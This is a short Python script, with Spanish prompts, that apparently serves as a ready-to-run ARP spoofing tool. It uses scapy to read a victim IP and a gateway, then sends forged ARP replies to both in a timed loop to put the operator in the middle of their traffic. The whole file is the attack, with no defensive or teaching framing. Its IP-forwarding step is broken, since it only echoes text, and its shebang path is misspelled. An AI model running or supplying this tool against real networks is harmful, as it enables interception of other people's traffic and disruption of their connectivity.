#!/user/bin/env python

import scapy.all as scapy
import subprocess
import time
  
def mac(ip):
    arp_request = scapy.ARP(pdst = ip)
    broadcast = scapy.Ether(dst ="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout = 5, verbose = False)[0]
    return answered_list[0][1].hwsrc
  
def spoof(target_ip, spoof_ip):
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = mac(target_ip), psrc = spoof_ip)
    subprocess.check_output(["echo"," 1 > /proc/sys/net/ipv4/ip_forward"])
    print(packet.show()) 
    scapy.send(packet)
  
try:
    sent_packets_count = 0
    print("Ip de la victima")
    victima = input ()
    print("Geteway")
    gateway = input ()
    print("Tiempo ejecución")
    timec = input ()
    timefin = float(timec) * 60
    tiempoej = 0
    myStart = time.time()
    while tiempoej <= timefin:
        print("1 Victima "+str(victima)+" Hacker "+str(gateway))
        spoof(victima, gateway)
        print("2 Hacker "+str(gateway)+" Victima "+str(victima))
        spoof(gateway, victima)
        tiempoej = time.time() - myStart
        print("total time taken this loop: "+str(tiempoej)+ " Inicio: "+str(myStart)+" Actual: "+str(time.time()))
        sent_packets_count = sent_packets_count + 2
        print("\r[+] Packets Sent: "+str(sent_packets_count))
        time.sleep(2) # Waits for two seconds
  
except KeyboardInterrupt:
    print("Arp Spoof Finalizo")